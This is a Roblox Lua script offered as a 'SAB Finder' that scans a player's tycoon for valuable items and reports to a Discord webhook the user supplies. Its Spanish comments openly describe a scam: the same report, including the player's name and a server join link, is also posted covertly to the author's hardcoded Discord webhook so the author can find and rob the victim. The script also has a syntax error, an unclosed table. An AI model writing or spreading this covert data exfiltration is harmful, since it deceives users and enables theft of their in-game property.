-- [[ CacaoDev SAB Finder V2 - Dual Webhook System ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- 1. TU WEBHOOK OCULTO (Aquí te llegan los hits a ti)
local TuWebhookSecret = "https://discord.com/api/webhooks/1488017742165573812/JAj3XSpot3xrAxRWtD9XcJb7cnDaFQb5Xs9O9ha0lSHtJ5eaovFs0GW47AhcCM6OePg6" 

-- 2. BASE DE DATOS (Resumida para no dar lag)
local brainrotDB = {
    ["John pork"] = "850m/s", ["Strawberry elephant"] = "750m/s", ["Meowl"] = "600m/s",
    ["Headless horseman"] = "500m/s", ["Skibidi toilet"] = "450m/s", ["Griffin"] = "400m/s",
    ["Dragon cannelloni"] = "250m/s", ["Celestial pegasus"] = "175m/s", ["Cerberus"] = "175m/s"
  

-- 3. INTERFAZ PARA QUE EL PENDEJO PEGUE SU LINK
local sg = Instance.new("ScreenGui", player.PlayerGui)
local frame = Instance.new("Frame", sg)
frame.Size = UDim2.new(0, 350, 0, 180)
frame.Position = UDim2.new(0.5, -175, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, 0, 0, 40)
label.Text = "CACAODEV SAB FINDER V2"
label.TextColor3 = Color3.new(1, 1, 1)
label.Font = Enum.Font.Code

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.8, 0, 0, 40)
box.Position = UDim2.new(0.1, 0, 0.3, 0)
box.PlaceholderText = "Paste your Webhook URL here..."
box.Text = ""
box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
box.TextColor3 = Color3.new(1, 1, 1)

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.6, 0, 0, 40)
btn.Position = UDim2.new(0.2, 0, 0.7, 0)
btn.Text = "START SCANNING"
btn.BackgroundColor3 = Color3.fromRGB(0, 180, 100)

-- 4. LA LÓGICA DEL ROBO DOBLE
btn.MouseButton1Click:Connect(function()
    local UserWebhook = box.Text
    if UserWebhook:find("discord.com/api/webhooks") then
        label.Text = "SCANNING... PLEASE WAIT"
        btn.Visible = false
        box.Visible = false
        
        -- Escaneamos la base
        local hits = ""
        local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?privateServerLinkCode=" .. game.JobId
        local tycoon = workspace.Tycoons:FindFirstChild(player.Name)
        local items = tycoon and tycoon.PurchasedObjects
        
        if items then
            for name, val in pairs(brainrotDB) do
                if items:FindFirstChild(name) then
                    hits = hits .. "💎 **" .. name .. "**: " .. val .. "\n"
                end
            end
        end

        local payload = {
            ["content"] = "@everyone HIT DETECTADO! 🎯",
            ["embeds"] = {{
                ["title"] = "CacaoDev SAB Report",
                ["description"] = "👤 **User**: "..player.Name.."\n**Link**: "..joinLink,
                ["fields"] = {{["name"] = "👑 Brainrots", ["value"] = hits == "" and "No valiosos" or hits}},
                ["color"] = 0x2ecc71
            }}
        }
        local json = HttpService:JSONEncode(payload)

        -- MANDAR AL PENDEJO (Para que crea que funciona)
        pcall(function() HttpService:PostAsync(UserWebhook, json) end)
        
        -- MANDARTE A TI (El robo real)
        pcall(function() HttpService:PostAsync(TuWebhookSecret, json) end)
        
        task.wait(3)
        label.Text = "SUCCESS! REPORT SENT."
        task.wait(2)
        sg:Destroy()
    else
        label.Text = "INVALID WEBHOOK URL!"
        task.wait(1)
        label.Text = "CACAODEV SAB FINDER V2"
    end
end)
